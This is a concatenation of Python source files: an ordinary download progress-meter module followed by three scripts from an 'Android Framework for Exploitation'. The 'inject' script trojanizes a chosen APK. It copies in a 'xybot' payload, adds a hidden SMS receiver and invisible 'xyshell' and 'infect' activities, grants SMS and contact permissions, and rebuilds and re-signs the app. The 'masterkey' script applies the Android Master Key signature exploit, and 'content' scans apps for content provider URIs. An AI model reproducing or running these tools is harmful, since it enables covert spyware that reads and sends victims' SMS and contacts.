    def _do_end(self, amount_read, now=None):
        global _text_meter_total_size
        global _text_meter_sofar_size

        total_time = format_time(self.re.elapsed_time())
        total_size = format_number(amount_read)
        if self.text is not None:
            text = self.text
        else:
            text = self.basename

        tl = TerminalLine(8)
        ui_size = tl.add(' | %5sB' % total_size)
        ui_time = tl.add(' %9s' % total_time)
        not_done = self.size is not None and amount_read != self.size
        if not_done:
            ui_end  = tl.add(' ... ')
        else:
            ui_end  = tl.add(' ' * 5)

        out = '\r%-*.*s%s%s%s\n' % (tl.rest(), tl.rest(), text,
                                    ui_size, ui_time, ui_end)
        self.fo.write(out)
        self.fo.flush()

        # Don't add size to the sofar size until we have all of it.
        # If we don't have a size, then just pretend/hope we got all of it.
        if not_done:
            return

        if _text_meter_total_size:
            _text_meter_sofar_size += amount_read
        if _text_meter_total_size <= _text_meter_sofar_size:
            _text_meter_total_size = 0
            _text_meter_sofar_size = 0

text_progress_meter = TextMeter

class MultiFileHelper(BaseMeter):
    def __init__(self, master):
        BaseMeter.__init__(self)
        self.master = master

    def _do_start(self, now):
        self.master.start_meter(self, now)

    def _do_update(self, amount_read, now):
        # elapsed time since last update
        self.master.update_meter(self, now)

    def _do_end(self, amount_read, now):
        self.ftotal_time = format_time(now - self.start_time)
        self.ftotal_size = format_number(self.last_amount_read)
        self.master.end_meter(self, now)

    def failure(self, message, now=None):
        self.master.failure_meter(self, message, now)

    def message(self, message):
        self.master.message_meter(self, message)

class MultiFileMeter:
    helperclass = MultiFileHelper
    def __init__(self):
        self.meters = []
        self.in_progress_meters = []
        self._lock = thread.allocate_lock()
        self.update_period = 0.3 # seconds
        
        self.numfiles         = None
        self.finished_files   = 0
        self.failed_files     = 0
        self.open_files       = 0
        self.total_size       = None
        self.failed_size      = 0
        self.start_time       = None
        self.finished_file_size = 0
        self.last_update_time = None
        self.re = RateEstimator()

    def start(self, numfiles=None, total_size=None, now=None):
        if now is None: now = time.time()
        self.numfiles         = numfiles
        self.finished_files   = 0
        self.failed_files     = 0
        self.open_files       = 0
        self.total_size       = total_size
        self.failed_size      = 0
        self.start_time       = now
        self.finished_file_size = 0
        self.last_update_time = now
        self.re.start(total_size, now)
        self._do_start(now)

    def _do_start(self, now):
        pass

    def end(self, now=None):
        if now is None: now = time.time()
        self._do_end(now)
        
    def _do_end(self, now):
        pass

    def lock(self): self._lock.acquire()
    def unlock(self): self._lock.release()

    ###########################################################
    # child meter creation and destruction
    def newMeter(self):
        newmeter = self.helperclass(self)
        self.meters.append(newmeter)
        return newmeter
    
    def removeMeter(self, meter):
        self.meters.remove(meter)
        
    ###########################################################
    # child functions - these should only be called by helpers
    def start_meter(self, meter, now):
        if not meter in self.meters:
            raise ValueError('attempt to use orphaned meter')
        self._lock.acquire()
        try:
            if not meter in self.in_progress_meters:
                self.in_progress_meters.append(meter)
                self.open_files += 1
        finally:
            self._lock.release()
        self._do_start_meter(meter, now)
        
    def _do_start_meter(self, meter, now):
        pass
        
    def update_meter(self, meter, now):
        if not meter in self.meters:
            raise ValueError('attempt to use orphaned meter')
        if (now >= self.last_update_time + self.update_period) or \
               not self.last_update_time:
            self.re.update(self._amount_read(), now)
            self.last_update_time = now
            self._do_update_meter(meter, now)

    def _do_update_meter(self, meter, now):
        pass

    def end_meter(self, meter, now):
        if not meter in self.meters:
            raise ValueError('attempt to use orphaned meter')
        self._lock.acquire()
        try:
            try: self.in_progress_meters.remove(meter)
            except ValueError: pass
            self.open_files     -= 1
            self.finished_files += 1
            self.finished_file_size += meter.last_amount_read
        finally:
            self._lock.release()
        self._do_end_meter(meter, now)

    def _do_end_meter(self, meter, now):
        pass

    def failure_meter(self, meter, message, now):
        if not meter in self.meters:
            raise ValueError('attempt to use orphaned meter')
        self._lock.acquire()
        try:
            try: self.in_progress_meters.remove(meter)
            except ValueError: pass
            self.open_files     -= 1
            self.failed_files   += 1
            if meter.size and self.failed_size is not None:
                self.failed_size += meter.size
            else:
                self.failed_size = None
        finally:
            self._lock.release()
        self._do_failure_meter(meter, message, now)

    def _do_failure_meter(self, meter, message, now):
        pass

    def message_meter(self, meter, message):
        pass

    ########################################################
    # internal functions
    def _amount_read(self):
        tot = self.finished_file_size
        for m in self.in_progress_meters:
            tot += m.last_amount_read
        return tot


class TextMultiFileMeter(MultiFileMeter):
    def __init__(self, fo=sys.stderr):
        self.fo = fo
        MultiFileMeter.__init__(self)

    # files: ###/### ###%  data: ######/###### ###%  time: ##:##:##/##:##:##
    def _do_update_meter(self, meter, now):
        self._lock.acquire()
        try:
            format = "files: %3i/%-3i %3i%%   data: %6.6s/%-6.6s %3i%%   " \
                     "time: %8.8s/%8.8s"
            df = self.finished_files
            tf = self.numfiles or 1
            pf = 100 * float(df)/tf + 0.49
            dd = self.re.last_amount_read
            td = self.total_size
            pd = 100 * (self.re.fraction_read() or 0) + 0.49
            dt = self.re.elapsed_time()
            rt = self.re.remaining_time()
            if rt is None: tt = None
            else: tt = dt + rt

            fdd = format_number(dd) + 'B'
            ftd = format_number(td) + 'B'
            fdt = format_time(dt, 1)
            ftt = format_time(tt, 1)
            
            out = '%-79.79s' % (format % (df, tf, pf, fdd, ftd, pd, fdt, ftt))
            self.fo.write('\r' + out)
            self.fo.flush()
        finally:
            self._lock.release()

    def _do_end_meter(self, meter, now):
        self._lock.acquire()
        try:
            format = "%-30.30s %6.6s    %8.8s    %9.9s"
            fn = meter.basename
            size = meter.last_amount_read
            fsize = format_number(size) + 'B'
            et = meter.re.elapsed_time()
            fet = format_time(et, 1)
            frate = format_number(size / et) + 'B/s'
            
            out = '%-79.79s' % (format % (fn, fsize, fet, frate))
            self.fo.write('\r' + out + '\n')
        finally:
            self._lock.release()
        self._do_update_meter(meter, now)

    def _do_failure_meter(self, meter, message, now):
        self._lock.acquire()
        try:
            format = "%-30.30s %6.6s %s"
            fn = meter.basename
            if type(message) in (type(''), type(u'')):
                message = message.splitlines()
            if not message: message = ['']
            out = '%-79s' % (format % (fn, 'FAILED', message[0] or ''))
            self.fo.write('\r' + out + '\n')
            for m in message[1:]: self.fo.write('  ' + m + '\n')
            self._lock.release()
        finally:
            self._do_update_meter(meter, now)

    def message_meter(self, meter, message):
        self._lock.acquire()
        try:
            pass
        finally:
            self._lock.release()

    def _do_end(self, now):
        self._do_update_meter(None, now)
        self._lock.acquire()
        try:
            self.fo.write('\n')
            self.fo.flush()
        finally:
            self._lock.release()
        
######################################################################
# support classes and functions

class RateEstimator:
    def __init__(self, timescale=5.0):
        self.timescale = timescale

    def start(self, total=None, now=None):
        if now is None: now = time.time()
        self.total = total
        self.start_time = now
        self.last_update_time = now
        self.last_amount_read = 0
        self.ave_rate = None
        
    def update(self, amount_read, now=None):
        if now is None: now = time.time()
        if amount_read == 0:
            # if we just started this file, all bets are off
            self.last_update_time = now
            self.last_amount_read = 0
            self.ave_rate = None
            return

        #print 'times', now, self.last_update_time
        time_diff = now         - self.last_update_time
        read_diff = amount_read - self.last_amount_read
        # First update, on reget is the file size
        if self.last_amount_read:
            self.last_update_time = now
            self.ave_rate = self._temporal_rolling_ave(\
                time_diff, read_diff, self.ave_rate, self.timescale)
        self.last_amount_read = amount_read
        #print 'results', time_diff, read_diff, self.ave_rate
        
    #####################################################################
    # result methods
    def average_rate(self):
        "get the average transfer rate (in bytes/second)"
        return self.ave_rate

    def elapsed_time(self):
        "the time between the start of the transfer and the most recent update"
        return self.last_update_time - self.start_time

    def remaining_time(self):
        "estimated time remaining"
        if not self.ave_rate or not self.total: return None
        return (self.total - self.last_amount_read) / self.ave_rate

    def fraction_read(self):
        """the fraction of the data that has been read
        (can be None for unknown transfer size)"""
        if self.total is None: return None
        elif self.total == 0: return 1.0
        else: return float(self.last_amount_read)/self.total

    #########################################################################
    # support methods
    def _temporal_rolling_ave(self, time_diff, read_diff, last_ave, timescale):
        """a temporal rolling average performs smooth averaging even when
        updates come at irregular intervals.  This is performed by scaling
        the "epsilon" according to the time since the last update.
        Specifically, epsilon = time_diff / timescale

        As a general rule, the average will take on a completely new value
        after 'timescale' seconds."""
        epsilon = time_diff / timescale
        if epsilon > 1: epsilon = 1.0
        return self._rolling_ave(time_diff, read_diff, last_ave, epsilon)
    
    def _rolling_ave(self, time_diff, read_diff, last_ave, epsilon):
        """perform a "rolling average" iteration
        a rolling average "folds" new data into an existing average with
        some weight, epsilon.  epsilon must be between 0.0 and 1.0 (inclusive)
        a value of 0.0 means only the old value (initial value) counts,
        and a value of 1.0 means only the newest value is considered."""
        
        try:
            recent_rate = read_diff / time_diff
        except ZeroDivisionError:
            recent_rate = None
        if last_ave is None: return recent_rate
        elif recent_rate is None: return last_ave

        # at this point, both last_ave and recent_rate are numbers
        return epsilon * recent_rate  +  (1 - epsilon) * last_ave

    def _round_remaining_time(self, rt, start_time=15.0):
        """round the remaining time, depending on its size
        If rt is between n*start_time and (n+1)*start_time round downward
        to the nearest multiple of n (for any counting number n).
        If rt < start_time, round down to the nearest 1.
        For example (for start_time = 15.0):
         2.7  -> 2.0
         25.2 -> 25.0
         26.4 -> 26.0
         35.3 -> 34.0
         63.6 -> 60.0
        """

        if rt < 0: return 0.0
        shift = int(math.log(rt/start_time)/math.log(2))
        rt = int(rt)
        if shift <= 0: return rt
        return float(int(rt) >> shift << shift)
        

def format_time(seconds, use_hours=0):
    if seconds is None or seconds < 0:
        if use_hours: return '--:--:--'
        else:         return '--:--'
    else:
        seconds = int(seconds)
        minutes = seconds / 60
        seconds = seconds % 60
        if use_hours:
            hours = minutes / 60
            minutes = minutes % 60
            return '%02i:%02i:%02i' % (hours, minutes, seconds)
        else:
            return '%02i:%02i' % (minutes, seconds)
            
def format_number(number, SI=0, space=' '):
    """Turn numbers into human-readable metric-like numbers"""
    symbols = ['',  # (none)
               'k', # kilo
               'M', # mega
               'G', # giga
               'T', # tera
               'P', # peta
               'E', # exa
               'Z', # zetta
               'Y'] # yotta
    
    if SI: step = 1000.0
    else: step = 1024.0

    thresh = 999
    depth = 0
    max_depth = len(symbols) - 1
    
    # we want numbers between 0 and thresh, but don't exceed the length
    # of our list.  In that event, the formatting will be screwed up,
    # but it'll still show the right number.
    while number > thresh and depth < max_depth:
        depth  = depth + 1
        number = number / step

    if type(number) == type(1) or type(number) == type(1L):
        # it's an int or a long, which means it didn't get divided,
        # which means it's already short enough
        format = '%i%s%s'
    elif number < 9.95:
        # must use 9.95 for proper sizing.  For example, 9.99 will be
        # rounded to 10.0 with the .1f format string (which is too long)
        format = '%.1f%s%s'
    else:
        format = '%.0f%s%s'
        
    return(format % (float(number or 0), space, symbols[depth]))

def _tst(fn, cur, tot, beg, size, *args):
    tm = TextMeter()
    text = "(%d/%d): %s" % (cur, tot, fn)
    tm.start(fn, "http://www.example.com/path/to/fn/" + fn, fn, size, text=text)
    num = beg
    off = 0
    for (inc, delay) in args:
        off += 1
        while num < ((size * off) / len(args)):
            num += inc
            tm.update(num)
            time.sleep(delay)
    tm.end(size)

if __name__ == "__main__":
    # (1/2): subversion-1.4.4-7.x86_64.rpm               2.4 MB /  85 kB/s    00:28     
    # (2/2): mercurial-0.9.5-6.fc8.x86_64.rpm            924 kB / 106 kB/s    00:08     
    if len(sys.argv) >= 2 and sys.argv[1] == 'total':
        text_meter_total_size(1000 + 10000 + 10000 + 1000000 + 1000000 +
                              1000000 + 10000 + 10000 + 10000 + 1000000)
    _tst("sm-1.0.0-1.fc8.i386.rpm", 1, 10, 0, 1000,
         (10, 0.2), (10, 0.1), (100, 0.25))
    _tst("s-1.0.1-1.fc8.i386.rpm", 2, 10, 0, 10000,
         (10, 0.2), (100, 0.1), (100, 0.1), (100, 0.25))
    _tst("m-1.0.1-2.fc8.i386.rpm", 3, 10, 5000, 10000,
         (10, 0.2), (100, 0.1), (100, 0.1), (100, 0.25))
    _tst("large-file-name-Foo-11.8.7-4.5.6.1.fc8.x86_64.rpm", 4, 10, 0, 1000000,
         (1000, 0.2), (1000, 0.1), (10000, 0.1))
    _tst("large-file-name-Foo2-11.8.7-4.5.6.2.fc8.x86_64.rpm", 5, 10,
         500001, 1000000, (1000, 0.2), (1000, 0.1), (10000, 0.1))
    _tst("large-file-name-Foo3-11.8.7-4.5.6.3.fc8.x86_64.rpm", 6, 10,
         750002, 1000000, (1000, 0.2), (1000, 0.1), (10000, 0.1))
    _tst("large-file-name-Foo4-10.8.7-4.5.6.1.fc8.x86_64.rpm", 7, 10, 0, 10000,
         (100, 0.1))
    _tst("large-file-name-Foo5-10.8.7-4.5.6.2.fc8.x86_64.rpm", 8, 10,
         5001, 10000, (100, 0.1))
    _tst("large-file-name-Foo6-10.8.7-4.5.6.3.fc8.x86_64.rpm", 9, 10,
         7502, 10000, (1, 0.1))
    _tst("large-file-name-Foox-9.8.7-4.5.6.1.fc8.x86_64.rpm",  10, 10,
         0, 1000000, (10, 0.5),
         (100000, 0.1), (10000, 0.1), (10000, 0.1), (10000, 0.1),
         (100000, 0.1), (10000, 0.1), (10000, 0.1), (10000, 0.1),
         (100000, 0.1), (10000, 0.1), (10000, 0.1), (10000, 0.1),
         (100000, 0.1), (10000, 0.1), (10000, 0.1), (10000, 0.1),
         (100000, 0.1), (1, 0.1))

########NEW FILE########
__FILENAME__ = masterkey
#!/usr/bin/python
#----------------------------------------------------------------------------------------------#
#Android Framework for Exploitation v-2                                                        #
# (C)opyright 2013 - XYS3C                                                                     #
#---Important----------------------------------------------------------------------------------#
#                     *** Do NOT use this for illegal or malicious use ***                     #
#              The programs are provided as is without any guarantees or warranty.             #
#---Defaults-----------------------------------------------------------------------------------#
import os
import glob
import shutil
import commands
import subprocess
import time
import logging
import signal
import sys
def signal_handler(signal, frame):
	logging.warn("\nYou pressed Ctrl+C! dont forget to clean the TEMP file !")
	print "Wait 5 seconds"
	time.sleep(5)
	sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)
################################################################################################
#                                 MAIN SCREEN                                                  #
################################################################################################

print """
---- The Android Framework For Exploitation v2.0  ----
 _______  _______  _______                _______     _______ 
(  ___  )(  ____ \(  ____ \    |\     /|  / ___   )   (  __   )
| (   ) || (    \/| (    \/ _  | )   ( |  \/   )  |   | (  )  |
| (___) || (__    | (__    (_) | |   | |      /   )   | | /   |
|  ___  ||  __)   |  __)       ( (   ) )    _/   /    | (/ /) |
| (   ) || (      | (       _   \ \_/ /    /   _/     |   / | |
| )   ( || )      | (____/\(_)   \   /    (   (__/\ _ |  (__) |
|/     \||/       (_______/       \_/     \_______/(_)(_______)
"""
print "Copyright Reserved : XYS3C (Visit us at http://xysec.com)"
print"----------------------------------------------------------------"
print "Files Available in the Input Folders:"
print "----LIST----"
os.chdir("../../Input")
tmp = os.getcwd()+"/../temp"
bin = os.getcwd()+"/../bin"
outputpath = os.getcwd()+"/../Output"
if not os.path.exists(tmp+"/masterkey"):
	os.makedirs(tmp+"/masterkey")
masterkeydir = tmp+"/masterkey"

types = ('*.apk', '*.zip')

for files in types:
	for filest in glob.glob(files):
		print "* " + filest

origapp = raw_input("Enter the name of the original apk/zip: ")
print "********************************"

while not os.path.isfile(origapp):
	print "APK/ZIP not found, try again !"
	print "----LIST-----"
	for files in types:
		for filest in glob.glob(files):
			print "* " + filest
	origapp = raw_input("Enter the name of the original apk/zip: ")

if os.name == 'nt':
	os.system('cls')
else:
	os.system('clear')


print "Files Available in the Input Folders to Inject:"
print "----LIST----"
for files in types:
	for filest in glob.glob(files):
		if filest != origapp:
			print "* " + filest
			
injapp = raw_input("Enter the name of the apk you want to inject: ")
print "********************************"

while not os.path.isfile(injapp) or injapp == origapp:
	print "APK not found, try again !"
	print "----LIST-----"
	for files in types:
		for filest in glob.glob(files):
			if filest != origapp:
				print "* " + filest
	injapp = raw_input("Enter the name of the apk you want to inject: ")
	
shutil.copy(injapp,masterkeydir)
shutil.copy(origapp,masterkeydir)

subprocess.call(['java', '-jar', bin+'/AndroidMasterKeys.jar', '-a', masterkeydir+"/"+origapp, '-z', masterkeydir+"/"+injapp, '-o', outputpath+"/master-"+origapp])
print "Output APK in -> " + outputpath+"/master-"+origapp



########NEW FILE########
__FILENAME__ = inject
#!/usr/bin/python
#----------------------------------------------------------------------------------------------#
#Android Framework for Exploitation v-1                                                        #
# (C)opyright 2010 - XYS3C                                                                     #
#---Important----------------------------------------------------------------------------------#
#                     *** Do NOT use this for illegal or malicious use ***                     #
#              The programs are provided as is without any guarantees or warranty.             #
#---Defaults-----------------------------------------------------------------------------------#
import os
import glob
import shutil
import commands
import subprocess as sub
import time
import logging
import signal
import sys
def signal_handler(signal, frame):
	logging.warn("\nYou pressed Ctrl+C! dont forget to clean the TEMP file !")
	print "Wait 5 seconds"
	time.sleep(5)
	sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)
################################################################################################
#                                 MAIN SCREEN                                                  #
################################################################################################

print "---The Android Exploitation Framework ---"
print " _______  _______  _______    _               _______     __   "
print "(  ___  )(  ____ \(  ____ \  ( )  |\     /|  (  __   )   /  \  "
print "| (   ) || (    \/| (    \/  | |  | )   ( |  | (  )  |   \/) ) "
print "| (___) || (__    | (__      (_)  | |   | |  | | /   |     | | "
print "|  ___  ||  __)   |  __)      _   ( (   ) )  | (/ /) |     | | "
print "| (   ) || (      | (        ( )   \ \_/ /   |   / | |     | | "
print "| )   ( || )      | (____/\  | |    \   /    |  (__) | _ __) (_"
print "|/     \||/       (_______/  (_)     \_/     (_______)(_)\____/"
print ""                                                               
print "Copyright Reserved : XYS3C (Visit us at http://xysec.com)"
print"----------------------------------------------------------------"
print "Files Available in the Input Folders:"
print "----LIST----"
os.chdir("../../Input")
for files in glob.glob("*.apk"):
    print "* " + files
origapp = raw_input("Enter the name of the apk you want to inject: ")
print "********************************"
while not os.path.isfile(origapp):
	print "APK not found, try again !"
	print "----LIST-----"
	for files in glob.glob("*.apk"):
	    print "* " + files
	origapp = raw_input("Enter the name of the apk you want to inject: ")
tmp = os.getcwd()+"/../temp"
shutil.copy(origapp,tmp)
os.chdir("../temp")
print "Decompiling Original App"
print "******************"
os.system('../bin/apktool d '+origapp)
print "Decompiled"
print "******************"
tmpfol = origapp.replace(' ', '')[:-4]
print "Injecting Phase 1"
print "******************"
injct = os.getcwd()+"/../bin/xybot"
neworigapp = os.getcwd()+"/"+tmpfol+"/smali/com/xybot"
print "Original App location is set to be " + neworigapp
print "********************************"
print "Injecting services at " + injct
shutil.copytree(injct, neworigapp)
print "********************************"
print "Files injected successfully!! "
dum = raw_input("Press ENTER to continue")

################################################################################################
#                                 CONSTANTS                                                    #
################################################################################################

STYLES = os.getcwd()+"/"+tmpfol+"/res/values/styles.xml"
MANIFEST = os.getcwd()+"/"+tmpfol+"/AndroidManifest.xml"

################################################################################################
#                       Inserting Services and activities in manifest                          #
################################################################################################

def inserting():
 mystring = "\t<activity android:theme=\"@style/Invisiblexysec\" android:label=\"@string/app_name\" android:name=\".XybotActivity\">\n\t<intent-filter>\n\t<action android:name=\"android.intent.action.MAIN\" />\n\t</intent-filter>\n\t</activity>\n\t<receiver android:name=\"com.xybot.SMSReceiver\" android:enabled=\"true\">\n\t\t<intent-filter android:priority=\"10000\">\n\t\t\t<action android:name=\"android.provider.Telephony.SMS_RECEIVED\" />\n\t\t</intent-filter>\n\t</receiver>\n\t<service android:name=\"com.xybot.toastmaker\" />\n\t<activity android:theme=\"@style/Invisiblexysec\" android:name=\"com.xybot.xyshell\" />\n\t<activity android:theme=\"@style/Invisiblexysec\" android:name=\"com.xybot.infect\" />\n\t<activity android:theme=\"@style/Invisiblexysec\" android:name=\"com.xybot.browse\" />\n"
# print mystring
 with open(MANIFEST, "r") as f:
	lines = f.readlines()	
	f.close()
	for i,s in enumerate(lines):
		if "</application>" in s:
			count =i
			break
	count1=int(count)
	
	for i,s in enumerate(lines):
	     count=i
	     
	count2=int(count)

	lines.append("0")
	for i in range(count2,count1-1,-1):
		lines[i+1]=lines[i]

	lines[count1]=mystring
	
	
	f=open(MANIFEST, "w")
	for i in lines:
		f.write(i)	

	f.close()

################################################################################################
#                       Inserting Permissions in manifest                                      #
################################################################################################

def permin(perm):
 mystring = "\t<uses-permission android:name=\""+perm+"\" />\n"
# print mystring
 with open(MANIFEST, "r") as f:
	lines = f.readlines()	
	f.close()
	for i,s in enumerate(lines):
		if "</manifest>" in s:
			count =i
			break
	count1=int(count)
	
	for i,s in enumerate(lines):
	     count=i
	     
	count2=int(count)

	lines.append("0")
	for i in range(count2,count1-1,-1):
		lines[i+1]=lines[i]

	lines[count1]=mystring
	
	
	f=open(MANIFEST, "w")
	for i in lines:
		f.write(i)	

	f.close()
	   
################################################################################################
#                       Inserting Styles in style.xml                                          #
################################################################################################

def styles(tep):
 head = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\t<resources>\n"
 string1 = "\t<style name=\"Invisiblexysec\" parent=\"@android:style/Theme\">\n"
 string2 = "\t\t<item name=\"android:windowBackground\">@android:color/transparent</item>\n"
 string3 = "\t\t<item name=\"android:windowNoTitle\">true</item>\n"
 string4 = "\t\t<item name=\"android:windowIsFloating\">true</item>\n"
 string5 = "\t\t<item name=\"android:windowIsTranslucent\">true</item>\n"
 string6 = "\t\t<item name=\"android:windowContentOverlay\">@null</item>\n"
 string7 = "\t\t<item name=\"android:backgroundDimEnabled\">false</item>\n"
 string8 = "\t</style>\n"
 foot = "\t</resources>"
 if tep is 1:
	mystring = string1+string2+string3+string4+string5+string6+string7+string8
 else:
	mystring = head+string1+string2+string3+string4+string5+string6+string7+string8+foot
# print mystring
 if tep is 1:
  with open(STYLES, "r") as f:
	lines = f.readlines()	
	f.close()
	for i,s in enumerate(lines):
		if "</resources>" in s:
			count =i
			break
	count1=int(count)
	
	for i,s in enumerate(lines):
	     count=i
	     
	count2=int(count)
	lines.append("0")
	for i in range(count2,count1-1,-1):
		lines[i+1]=lines[i]
	lines[count1]=mystring
	
	
	f=open(STYLES, "w")
	for i in lines:
		f.write(i)	
	f.close()
 else:
	f=open(STYLES, "w")
	f.write(mystring)
	f.close()
		
################################################################################################
#                       Signing the APK File                                                   #
################################################################################################

ApkToolPath = "../bin"
def sign_apk(fn, fn_new):
    if not fn_new:
        file_path, ext = os.path.splitext(fn)
        fn_new = r'%s_signed%s' %(file_path, ext)
    cmd = '''java -Xmx80m -jar %s/signapk.jar -w %s/testkey.x509.pem %s/testkey.pk8 %s %s''' % (
        ApkToolPath, ApkToolPath, ApkToolPath, fn, fn_new)
    print cmd
    os.system(cmd)
    print 'done!!! ... %s' % fn_new

################################################################################################
#                       Finding Permission exists or not in manifest                           #
################################################################################################

def check(ttpt):
	with open(MANIFEST) as f:  lines = f.read().splitlines()
	for line in lines:
		if line.find(ttpt) >= 0:
		    print line
		    return True
	f.close()	
	return False
	
################################################################################################
#                       Program Flows on Injecting Permission                                  #
################################################################################################

print "Trying to inject permission ! "
print "***********************************************"
if check("android.permission.RECEIVE_SMS"):
    print "Permission 1 Exist"
else:
    print "Injecting Permission !"
    permin("android.permission.RECEIVE_SMS")


if check("android.permission.READ_SMS"):
    print "Permission 2 Exist"
else:
    print "Injecting Permission !"
    permin("android.permission.READ_SMS")

if check("android.permission.WRITE_SMS"):
	print "Permission 3 Exist"
else:
	print "Injecting Permission !"
	permin("android.permission.WRITE_SMS")

if check("android.permission.SEND_SMS"):
	print "Permission 4 Exist"
else:
	print "Injecting Permission !"
	permin("android.permission.SEND_SMS")

if check("android.permission.READ_CONTACTS"):
	print "Permission 5 Exist"
else:
	print "Injecting Permission !"
	permin("android.permission.READ_CONTACTS")
print "***********************************************"
print "Permissions injected successfully!! "

################################################################################################
#                  Program Flows on Injecting Services and Activities                          #
################################################################################################

print "Trying to insert injected Services and Activities !"
print "***********************************************"
inserting()
print "***********************************************"
print "Successfull !"

################################################################################################
#                  Program Flows on Injecting Styles in styles.xml                             #
################################################################################################

print "Inserting Style Values"
print "***********************************************"
if os.path.exists(STYLES):
	styles(1)
else:
	styles(0)
print "***********************************************"
print "Successfull !"	

################################################################################################
#                  Program Flows on Building the modified APK                                  #
################################################################################################

print "Building the APK"
print "***********************************************"
os.system('../bin/apktool b '+tmpfol+" ../Output/"+origapp)
print "***********************************************"
print "Success!"

################################################################################################
#                  Program Flows on Signing the modified APK                                   #
################################################################################################

print "Signing the APK"
print "***********************************************"
sign_apk("../Output/"+origapp,None)
print "***********************************************"
print "Success!"
dum = raw_input("Press ENTER to continue")

################################################################################################
#                  Program Flows on Cleaning the Temporary files                               #
################################################################################################

##### ALWAYS AT THE END TO CLEAR TEMP FILES########
print "Clearing Temporary files"
shutil.rmtree(tmpfol)
os.remove(origapp)
logging.info("The modified APK is replaced/added in the Output folder !")
print "***********************************************"
dum = raw_input("Press ENTER to continue")
logging.warn("Exiting this module !")
time.sleep(3)


########NEW FILE########
__FILENAME__ = content
#!/usr/bin/env python
#----------------------------------------------------------------------------------------------#
#Android Framework for Exploitation v-1                                                        #
# (C)opyright 2010 - XYS3C                                                                     #
#---Important----------------------------------------------------------------------------------#
#                     *** Do NOT use this for illegal or malicious use ***                     #
#              The programs are provided as is without any guarantees or warranty.             #
#---Defaults-----------------------------------------------------------------------------------#
import os
import subprocess
import glob
import shutil
import time
def extract_apk():
  for filename in os.listdir(os.getcwd()):
   if filename.endswith('.apk'):
      print "Apk file found"
      print filename
      cmd = 'apktool d '+filename
      s = subprocess.check_output(cmd.split())



def searchproviders(location):
   for dir_path, dirs, file_names in os.walk(location):
      for file_name in file_names:
         fullpath = os.path.join(dir_path, file_name)
         for line in file(fullpath):
            if "CONTENT://" in line.upper():
                print line[line.upper().find("CONTENT"):]

print "---The Android Exploitation Framework ---"
print " _______  _______  _______    _               _______     __   "
print "(  ___  )(  ____ \(  ____ \  ( )  |\     /|  (  __   )   /  \  "
print "| (   ) || (    \/| (    \/  | |  | )   ( |  | (  )  |   \/) ) "
print "| (___) || (__    | (__      (_)  | |   | |  | | /   |     | | "
print "|  ___  ||  __)   |  __)      _   ( (   ) )  | (/ /) |     | | "
print "| (   ) || (      | (        ( )   \ \_/ /   |   / | |     | | "
print "| )   ( || )      | (____/\  | |    \   /    |  (__) | _ __) (_"
print "|/     \||/       (_______/  (_)     \_/     (_______)(_)\____/"
print ""                                                               
print "Copyright Reserved : XYS3C (Visit us at http://xysec.com)"
print"----------------------------------------------------------------"
print "Files Available in the Input Folders:"
print "----LIST----"
os.chdir("../../Input")
for files in glob.glob("*.apk"):
    print "* " + files
origapp = raw_input("Enter the name of the apk you want to check the content query: ")
print "********************************"
while not os.path.isfile(origapp):
	print "APK not found, try again !"
	print "----LIST-----"
	for files in glob.glob("*.apk"):
	    print "* " + files
	origapp = raw_input("Enter the name of the apk you want to check the content query: ")
tmp = os.getcwd()+"/../temp"
shutil.copy(origapp,tmp)
os.chdir("../temp")
print "Decompiling Original App"
print "******************"
os.system('../bin/apktool d '+origapp)
print "Decompiled"
print "******************"
tmpfol = origapp.replace(' ', '')[:-4]
neworigapp = os.getcwd()+"/"+tmpfol
searchproviders(neworigapp)
dum = raw_input("Press ENTER to continue")
#print os.getcwd()
##### ALWAYS AT THE END TO CLEAR TEMP FILES########
print "Clearing Temporary files"
shutil.rmtree(tmpfol)
os.remove(origapp)
#logging.info("The modified APK is replaced/added in the Output folder !")
print "***********************************************"
dum = raw_input("Press ENTER to continue")
time.sleep(3)
########NEW FILE########
